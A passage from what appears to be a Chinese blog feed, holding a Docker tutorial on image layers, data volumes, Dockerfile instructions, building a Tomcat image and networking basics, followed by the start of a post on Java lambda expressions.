容器上的程序直接使用的都是实际物理机的硬件资源，因此在CPU、内存利用率上 <code>Docker</code> 将会在效率上有明显优势。</p></li><li><p><code>Docker</code> 利用的是宿主机的内核，而不需要 <code>Guest OS</code>，因此，当新建一个容器时，<code>Docker</code> 不需要和虚拟机一样重新加载一个操作系统，避免了引导、加载操作系统内核这个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载Guest OS，这个新建过程是分钟级别的，而<code>Docker</code>由于直接利用宿主机的操作系统则省略了这个过程，因此新建一个<code>Docker</code>容器只需要几秒钟。</p></li></ul><p>以下简单总结两者区别：</p><table><thead><tr><th></th><th>Docker容器</th><th>虚拟机（VM）</th></tr></thead><tbody><tr><td>操作系统</td><td>与宿主机共享OS</td><td>宿主机OS上运行宿主机OS</td></tr><tr><td>存储大小</td><td>镜像小，便于存储与传输</td><td>镜像庞大（vmdk等</td></tr><tr><td>运行性能</td><td>几乎无额外性能损失</td><td>操作系统额外的cpu、内存消耗</td></tr><tr><td>移植性</td><td>轻便、灵活、适用于Linux</td><td>笨重、与虚拟化技术耦合度高</td></tr><tr><td>硬件亲和性</td><td>面向软件开发者</td><td>面向硬件运维者</td></tr></tbody></table><h1 id="五、Docker-镜像解析"><a href="#五、Docker-镜像解析" class="headerlink" title="五、Docker 镜像解析"></a>五、Docker 镜像解析</h1><h2 id="1-什么是镜像"><a href="#1-什么是镜像" class="headerlink" title="1. 什么是镜像"></a>1. 什么是镜像</h2><p><strong>镜像</strong> 是一种轻量级，可执行的软件包，用来打包软件运行环境和基于运行软件开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p><p>所有的应用，直接打包制作成docker镜像，就可以直接跑起来</p><h2 id="2-Docker-镜像加载原理"><a href="#2-Docker-镜像加载原理" class="headerlink" title="2. Docker 镜像加载原理"></a>2. Docker 镜像加载原理</h2><blockquote><p><code>UnionFS</code> (联合文件系统)：一种分层、轻量级且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不通目录挂载到同一个虚拟文件系统下（unite serveral directories into a single virtual filesystem）。<code>Union</code> 文件系统是 <code>Docker</code> 镜像的基础，镜像可以通过分层来继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><ul><li>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</li></ul></blockquote><p><code>Docker</code> 的镜像实际上由一层一层的文件系统组成，这种层级的文件系统就是 <code>UnionFS</code> 。</p><p><code>bootfs</code>（boot file system）主要包含 <code>bootloader</code> 和 <code>kernel</code> ，<code>bootloader</code> 主要是引导加载 <code>kerel</code> ，<code>Linux</code>刚启动时会加载 <code>bootfs</code> 文件系统，在 <code>Docker</code> 镜像的最底层时<code>bootfs</code>。这一层与我们典型的 Linux&#x2F;Unix 内核是一样的，包含<code>boot</code> 加载器和内核。当<code>boot</code> 加载完成之后整个内核就都在内存中了，此时内存的使用权已由 <code>bootfs</code> 转交给内核，此时系统也会卸载 <code>bootfs</code></p><p><code>rootfs</code>(root file system)在<code>bootfs</code>之上，包含的就是典型的 Linux系统中的 <code>/dev</code>、<code>/proc</code>、<code>/bin</code>、<code>/etc</code> 等标准文件。<code>rootfs</code> 就是各种不同的操作系统发行版。</p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/056dadcbb6a137f4d148f236e1781765.png" alt="image-20210127195423589"> </p><blockquote><p>平时安装的虚拟机的 <code>CentOS</code> 都是好几个G，为什么<code>Docker</code> 中才200MB？ </p></blockquote><p>因为对于一个精简的 OS，<code>rootfs</code> 可以很小，只需要包含最基本的命令、工具和程序库就可以了，因为底层使用的是主机的 <code>Kernel</code>，自己只需要提供 <code>rootfs</code> 就可以了。由此可见，对于不同<code>Linux</code>发行版，<code>bootfs</code> 是基本一致的，<code>rootfs</code> 会有差别，因此不同的发行版可以公用 <code>bootfs</code> </p><h2 id="3-分层理解"><a href="#3-分层理解" class="headerlink" title="3. 分层理解"></a>3. 分层理解</h2><p> 当我们下载一个镜像的时候，可以看到，是一层一层的在下载！ </p><p><img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/060942e0f186ef5af927a2a493ec3139.png" alt="image-20210127200105189"> </p><h3 id="为什么Docker镜像要采取分层结构？"><a href="#为什么Docker镜像要采取分层结构？" class="headerlink" title="为什么Docker镜像要采取分层结构？"></a>为什么Docker镜像要采取分层结构？</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>资源共享</strong>：如果有多个镜像从相同的Base镜像构建而来，那么宿主机只需要在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务，且每一层的镜像都可以被共享。 </p><p>使用 <code>docker image inspect 镜像名称</code> 命令可以查看镜像分层</p><p><img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1657711330595.png" alt="1657711330595"></p><h3 id="分层结构解析"><a href="#分层结构解析" class="headerlink" title="分层结构解析"></a>分层结构解析</h3><p>所有的 Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上创建新的镜像层。</p><p>举一个简单的例子，假如基于 Ubuntu Linux 16.04 创建一个新的镜像，这就是新镜像的第一层；如果要在该镜像中添加python包，就会在基础镜像层之上创建了新的一个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层</p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/557352a082f700f43e9a11202f3f89d3.png" alt="在这里插入图片描述"> </p><p> 在添加额外的镜像层的同时，镜像始终保持是当前所有镜像的组合。下图中举了一个简单的例子，每个镜像层包含 3 个文件，而镜像包含了来自两个镜像层的 6 个文件 </p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ae7a455526e9c83c5abbf3a1c3316ea5.png" alt="在这里插入图片描述"> </p><p>上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。<br>下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有 6 个文件，这是因为最上层中的文件7 是文件 5 的一个更新版本 </p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ea0c20d1b2eb0b40c050ab9565b01974.png" alt="img"> </p><p>这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。<br>Docker 通过<strong>存储引擎</strong>（新版本采用<strong>快照机制</strong>）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统一的文件系统。<br>Linux 上可用的存储引擎有 AUFS、Overlay2、Device Mapper、Btrfs 以及 ZFS。顾名思义，每种存储引擎都基于 Linux 中对应的文件系统或者块设备技术，并且每种存储引擎都有其独有的性能特点。<br>下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。<br> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/e128423bfa5f571fce52c8acc1d9499c.png" alt="在这里插入图片描述"> </p><h3 id="镜像运行特点"><a href="#镜像运行特点" class="headerlink" title="镜像运行特点"></a>镜像运行特点</h3><p>Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p><p>这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/9723be5b48505dab13bf2841f1565fe8.png" alt="image-20210128121203472"> </p><h2 id="4-Commit-镜像"><a href="#4-Commit-镜像" class="headerlink" title="4. Commit 镜像"></a>4. Commit 镜像</h2><p> 当我们通过镜像启动一个容器时，分为了两层：容器层和镜像层；镜像层是可读的，容器层可写，我们的所有操作都是基于容器层，当我们对容器层修改完后，就可以再将修改后的容器层和不变的镜像曾一起打包成一个新的镜像，也就是<code>Commit</code>镜像</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提交容器成为一个新的副本</span><br>docker commit<br>docker commit -m=<span class="hljs-string">&quot;提交的描述信息&quot;</span> -a=<span class="hljs-string">&quot;作者&quot;</span> 容器<span class="hljs-built_in">id</span> 目标镜像名:[TAG]<br></code></pre></td></tr></table></figure><h1 id="六、容器数据卷"><a href="#六、容器数据卷" class="headerlink" title="六、容器数据卷"></a>六、容器数据卷</h1><h2 id="1-什么是容器数据卷"><a href="#1-什么是容器数据卷" class="headerlink" title="1. 什么是容器数据卷"></a>1. 什么是容器数据卷</h2><p> <code>docker</code> 将应用和环境打包成一个镜像，通过镜像启动容器运行，但这样存在一个问题：</p><ul><li>在容器中存储的程序数据是需要持久化的，<strong>不能容器删了数据也随之删除</strong>。比如，安装一个MySQL容器，在其中存储了大量数据，结果把容器删了数据也没了，就相当于删库跑路，这是不可能发生的。</li></ul><p>这就轮到卷技术大展身手的时候了，数据卷也就是<strong>目录的挂载</strong>，<strong>将容器内的目录挂载到<code>Linux</code>上</strong> ，<strong>实现了容器的持久化和数据同步操作，容器之间也可以共享数据。</strong></p><h2 id="2-使用数据卷"><a href="#2-使用数据卷" class="headerlink" title="2. 使用数据卷"></a>2. 使用数据卷</h2><p>以下三种方式可以实现目录挂载：</p><ul><li>在启动容器的命令中用 <code>-v</code> 参数指定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d -v Linux服务器目录:容器内目录<br></code></pre></td></tr></table></figure><ul><li>如果使用 <code>docker-compose</code> 方式启动容器，在 <code>docker-compose.yml</code> 中配置 <code>volumes</code>，可参考以下 <code>nginx</code> 的配置：</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">nginx:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span>     <span class="hljs-comment"># 镜像名称</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">nginx</span>     <span class="hljs-comment"># 容器名字</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>     <span class="hljs-comment"># 开机自动重启</span><br>        <span class="hljs-attr">ports:</span>     <span class="hljs-comment"># 端口号绑定（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;80:80&#x27;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;443:443&#x27;</span><br>        <span class="hljs-attr">volumes:</span>   <span class="hljs-comment"># 目录映射（Linux服务器目录:容器内目录）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/nginx.conf:/etc/nginx/nginx.conf</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./conf.d:/etc/nginx/conf.d</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/usr/share/nginx/html</span><br></code></pre></td></tr></table></figure><ul><li>还可以事先通过 <code>docker volume create 卷名</code> 命令创建数据卷，将容器内目录挂载到数据卷，所有docker容器内的卷，没有指定目录情况下都是在<code>/var/lib/docker/volumes/卷名/_data</code>下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker volume create portainer_data<br>docker run -d -p 8080:8080 -v portainer_data:/data<br><br><span class="hljs-comment"># 拓展：还可通过 容器内目录:ro/rw 限制容器的读写操作</span><br><span class="hljs-comment"># ro:read only 只读,该路径文件只能通过宿主机来操作,容器内无法操作</span><br><span class="hljs-comment"># rw:read write可读可写</span><br>docker run -d -P --name nginx02 -v specific-nginx:/etc/nginx:ro nginx<br>docker run -d -P --name nginx02 -v specific-nginx:/etc/nginx:rw nginx<br><br></code></pre></td></tr></table></figure><h2 id="3-初识-Dockerfile"><a href="#3-初识-Dockerfile" class="headerlink" title="3. 初识 Dockerfile"></a>3. 初识 Dockerfile</h2><p><code>Dockerfile</code> 就是用来构建 docker 镜像的构建文件，就是一段命令脚本，通过这个脚本可以生成一个镜像 ， 镜像是一层一层的，脚本中就是一个个命令，每个命令对应一层：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 创建一个dockerfile文件</span><br><br><span class="hljs-keyword">FROM</span> centos<br><br><span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;volume01&quot;</span>,<span class="hljs-string">&quot;volume02&quot;</span>]</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;----end----&quot;</span></span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /bin/bash</span><br></code></pre></td></tr></table></figure><p>在<code>Dockerfile</code> 文件目录下使用以下命令构建自定义的镜像 <code>mycentos:1.0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -f ./dockerfile -t mycentos:1.0 .<br></code></pre></td></tr></table></figure><h2 id="4-数据卷容器"><a href="#4-数据卷容器" class="headerlink" title="4. 数据卷容器"></a>4. 数据卷容器</h2><p>使用参数<code>--volumes-from</code> 来实现多个容器之间的数据同步，这里实现 <code>centos2</code> 对 <code>centos1</code> 的同步：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --name centos1 mycentos:1.0<br>docker run -it --name centos2 --volumes-from centos1 mycentos:1.0<br></code></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/img_convert/5a3b513892633d7b730cef9a2dfe282f.png" alt="image-20210129141417064"> </p><p>我们可以删除<code>docker01</code>，但数据并不会丢失；只要有一个容器再用，就不会丢失，因为数据卷是采用双向拷贝的技术，即使删除了一个容器，但数据已经拷贝到了其他容器中；</p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/b9564a015b35bb05629224617e277454.png" alt="image-20210129181811436"> </p><p><strong>总结</strong>：</p><ul><li>容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止</li><li>如果数据同步到了本地，本地的数据是不会删除的</li></ul><h1 id="七、DockerFile"><a href="#七、DockerFile" class="headerlink" title="七、DockerFile"></a>七、DockerFile</h1><h2 id="1-DockerFile-概述"><a href="#1-DockerFile-概述" class="headerlink" title="1. DockerFile 概述"></a>1. DockerFile 概述</h2><p>通常我们使用 <code>dockerfile</code> 来构建 <code>docker</code> 镜像</p><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7f9531e9e45f22b59d56756172257a8d.png" alt="image-20210129213822710"> </p><p>可以看出，镜像的构建步骤：</p><ol><li>编写一个<code>dockerfile</code>文件；</li><li><code>docker build</code> 构建成一个镜像；</li><li><code>docker run</code> 运行镜像；</li><li><code>docker push</code> 发布镜像至镜像仓库。</li></ol><h2 id="2-DockerFile-的构建过程"><a href="#2-DockerFile-的构建过程" class="headerlink" title="2. DockerFile 的构建过程"></a>2. DockerFile 的构建过程</h2><p><code>dockerfile</code> 编写规则：</p><ol><li>每个保留关键字（指令）都必须是大写字母；</li><li>执行顺序从上往下顺序执行；</li><li><code>#</code>代表注释；</li><li>每条指令都会创建并提交一个新的镜像层。</li></ol><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/d9615e20ea252dcadb7941875bc16d79.png" alt="image-20210129213927281"> </p><h2 id="3-DockerFile-常用指令"><a href="#3-DockerFile-常用指令" class="headerlink" title="3. DockerFile 常用指令"></a>3. DockerFile 常用指令</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span><span class="hljs-comment"># 基础镜像,从此开始构建</span><br><span class="hljs-keyword">MAINTAINER</span><span class="hljs-comment"># 镜像作者,通常为姓名+邮箱</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-comment"># 镜像构建时需要执行的命令</span></span><br><span class="hljs-keyword">ADD</span><span class="language-bash"><span class="hljs-comment"># 在镜像中需要添加的文件(tar包会自动解压成目录)</span></span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"><span class="hljs-comment"># 镜像的工作目录</span></span><br><span class="hljs-keyword">VOLUME</span><span class="language-bash"><span class="hljs-comment"># 容器数据卷,挂载主机的目录</span></span><br><span class="hljs-keyword">EXPOSE</span><span class="hljs-comment"># 对外的暴露端口</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"><span class="hljs-comment"># 指定容器启动时要运行的命令(只有最后一个生效,可被替代)</span></span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"><span class="hljs-comment"># 指定容器启动时要运行的命令(可以追加命令)</span></span><br><span class="hljs-keyword">ONBUILD</span><span class="hljs-comment"># 当构建一个被继承DockerFile时就会运行ONBUILD指令</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"><span class="hljs-comment"># 类似ADD,将文件拷贝到镜像中</span></span><br><span class="hljs-keyword">ENV</span><span class="hljs-comment"># 构建时的环境变量</span><br></code></pre></td></tr></table></figure><h2 id="4-实例：构建自己的-Tomcat-镜像"><a href="#4-实例：构建自己的-Tomcat-镜像" class="headerlink" title="4. 实例：构建自己的 Tomcat 镜像"></a>4. 实例：构建自己的 Tomcat 镜像</h2><blockquote><p> tomcat下载地址：<a href="https://tomcat.apache.org/download-90.cgi">https://tomcat.apache.org/download-90.cgi</a> </p><p> jdk下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a> </p></blockquote><p><strong>构建步骤</strong>：</p><ol><li><p><code>Tomcat</code>运行需要依赖于<code>jdk</code>，因此需要同时准备<code>Tomcat</code> 和 <code>jdk</code>的压缩包 ；</p></li><li><p>将两个压缩包通过<code>ftp</code>拷贝到服务器的<code>/home/tomcat</code>目录下 ；</p></li><li><p>在上述目录下编写 <code>dockerfile</code> 文件，推荐命名为 <code>Dockerfile</code> ， 这样就不需要通过<code>-f</code>指定，<code>build</code> 时会自动寻找这个文件；</p></li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">MAINTAINER</span> zsr&lt;<span class="hljs-number">1412578784</span>@qq.com&gt;<br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> readme.txt /usr/local/readme.txt</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> jdk-8u281-linux-x64.tar.gz /usr/local/</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> apache-tomcat-9.0.41.tar.gz /usr/local/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install vim</span><br><br><span class="hljs-keyword">ENV</span> MYPATH /usr/local<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> <span class="hljs-variable">$MYPATH</span></span><br><br><span class="hljs-keyword">ENV</span> JAVA_HOME /usr/local/jdk<br><span class="hljs-keyword">ENV</span> CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar<br><span class="hljs-keyword">ENV</span> CATALINA_HOME /usr/local/apache-tomcat-<span class="hljs-number">9.0</span>.<span class="hljs-number">41</span><br><span class="hljs-keyword">ENV</span> CATALINA_BASE /usr/local/apache-tomcat-<span class="hljs-number">9.0</span>.<span class="hljs-number">41</span><br><span class="hljs-keyword">ENV</span> PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin<br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /usr/local/apache-tomcat-9.0.41/bin/startup.sh &amp;&amp; <span class="hljs-built_in">tail</span> -F /url/local/apache-tomcat-9.0.41/bin/logs/catalina.out</span><br></code></pre></td></tr></table></figure><ol start="4"><li>构建镜像，在<code>/home/tomcat</code> 目录下执行以下命令（注意结尾的点号<code>.</code> 是指镜像构建时打包上传到Docker引擎中的文件的目录,不是本机目录）；</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t mytomcat .<br></code></pre></td></tr></table></figure><ol start="5"><li>查看镜像并启动容器；</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看构建的镜像</span><br>docker images<br><span class="hljs-comment"># 启动容器</span><br>docker run -d -P 47.95.238.165:8088:8080 --name my-tomcat <br>-v /home/tomcat/test:/usr/local/apache-tomcat-9.0.41/webapps/test <br>-v /home/tomcat/logs:/usr/local/apache-tomcat-9.0.41/logs <br>mytomcat<br></code></pre></td></tr></table></figure><ol start="6"><li>测试验证，使用 <code>公网IP:8080</code> 可以访问。</li></ol><p> <img src="/../blog-assets/docker%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1657804782062.png" alt="1657804782062"> </p><h1 id="八、Docker-网络"><a href="#八、Docker-网络" class="headerlink" title="八、Docker 网络"></a>八、Docker 网络</h1><h2 id="1-Docker-网络原理"><a href="#1-Docker-网络原理" class="headerlink" title="1. Docker 网络原理"></a>1. Docker 网络原理</h2><p>当我们用<code>ip addr</code>命令查看服务器内部网络地址时，可以发现三个地址：</p><ul><li>127.0.0.1 <strong>本机回环地址</strong></li><li>172.17.223.207 <strong>服务器内网IP地址</strong></li><li>172.18.0.1 <strong>docker0地址</strong></li></ul>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>基础知识</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>devOps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java中的lambda表达式</title>
    <link href="/2022/07/12/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/07/12/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>前言：异步的文章中，线程的创建用到了 <code>lambda</code> 表达式，作为 JDK 8的新特性同时也是<strong>函数式编程</strong>的代表实践，趁此机会学习一下</p></blockquote><h1 id="一、函数式编程思想概述"><a href="#一、函数式编程思想概述" class="headerlink" title="一、函数式编程思想概述"></a>一、函数式编程思想概述</h1><p>在数学中，函数就是有输入量、输出量的一套计算方案，也就是“拿数据做操作”</p><ul><li><p><a href="https://so.csdn.net/so/search?q=%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1&spm=1001.2101.3001.7020">面向对象</a>思想强调“必须通过对象的形式来做事情”</p></li><li><p>函数式思想则强调尽量忽略面向对象的复杂语句：“强调做什么，而不是以什么形式去做”</p></li></ul><p>而接下来要讲的Lambda表达式就是<strong>函数式思想</strong>的体现</p><h1 id="二、Lambda-表达式基础"><a href="#二、Lambda-表达式基础" class="headerlink" title="二、Lambda 表达式基础"></a>二、Lambda 表达式基础</h1><h2 id="1-为什么要使用-Lambda-表达式"><a href="#1-为什么要使用-Lambda-表达式" class="headerlink" title="1. 为什么要使用 Lambda 表达式"></a>1. 为什么要使用 Lambda 表达式</h2><p>这里还是以创建执行一个线程举例，有以下三种方式</p><p><strong>方式1</strong>，使用传统方式创建新对象：</p><ul><li>定义一个类MyRunnable接口，重写run方法</li><li>创建MyRunnable类的对象</li><li>创建Thread类对象，把MyRunnable的对象作为构造参数传递</li><li>启动线程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行一个新线程&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyRunnable</span> <span class="hljs-variable">myRunnable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>();<br><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(myRunnable);<br>thread.start();<br></code></pre></td></tr></table></figure><p><strong>方式2</strong>，在方式1的基础上做改进，使用<strong>匿名内部类</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行一个新线程&quot;</span>);<br>    &#125;<br>&#125;).start();<br></code></pre></td></tr></table></figure><p><strong>方式3</strong>，使用lambda做进一步简化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>    System.out.println(<span class="hljs-string">&quot;执行一个新线程&quot;</span>);<br>&#125;).start();<br></code></pre></td></tr></table></figure><p>通过以上三种方式，相信你已经看出来了，lambda表达式能使代码轻量化，极大地优化代码结构，它只关心入参和方法体（即做事的逻辑），其他的（返回类型，参数类型，方法名）都不关心。</p><h2 id="2-Lambda-表达式的标准格式"><a href="#2-Lambda-表达式的标准格式" class="headerlink" title="2. Lambda 表达式的标准格式"></a>2. Lambda 表达式的标准格式</h2><h3 id="Lambda表达式的代码分析"><a href="#Lambda表达式的代码分析" class="headerlink" title="Lambda表达式的代码分析"></a>Lambda表达式的代码分析</h3><ul><li><p>格式：<code>(形式参数...) -&gt; &#123;代码块&#125;</code>  </p></li><li><p><code>()</code>：包含方法的入参，里面若没有内容，可以看成是方法形式参数为空；若只有一个入参，可以省略 <code>()</code></p></li><li><p><code>-&gt;</code>：用箭头指向后面要做的事情</p></li><li><p><code>&#123;&#125;</code>：包含一段代码，我们称之为代码块，可以看成是方法体中的内容；若只有一行内容，可以省略 <code>&#123;&#125;</code> 、<code>;</code> ，有返回值可以省略 <code>return</code></p></li></ul><h3 id="Lambda表达式使用示例"><a href="#Lambda表达式使用示例" class="headerlink" title="Lambda表达式使用示例"></a>Lambda表达式使用示例</h3><p>需先定义一个接口，包含一个加法的抽象方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Operator</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> 